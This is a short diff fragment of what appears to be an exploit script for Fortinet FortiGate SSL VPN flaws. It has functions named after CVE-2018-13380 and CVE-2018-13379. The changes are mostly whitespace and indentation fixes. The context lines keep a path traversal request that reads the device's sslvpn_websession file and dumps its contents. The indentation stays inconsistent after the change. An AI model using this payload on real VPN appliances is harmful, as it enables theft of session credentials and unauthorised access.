@@ -140,6 +140,7 @@ def cve_2018_13380(host, port):
     print(' - %s' % red + url2)
     print(' - %s' % red + url3)
     
+
     
 def cve_2018_13379(host, port):
     url = 'https://%s%s/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession' % (host, port)
@@ -151,12 +152,12 @@ def cve_2018_13379(host, port):
         rb = b''
         _str = ''        
     	while True:
-       		chunk = img.read(8192)
-        	if chunk:
-         		for b in chunk:
+       	    chunk = img.read(8192)
+            if chunk:
+                for b in chunk:
                     rb += b     			
-        	else:
-          		break
+            else:
+          	break
                 
         print('Dumped the memory buffer of %s:' % host)               
         for byte in rb:
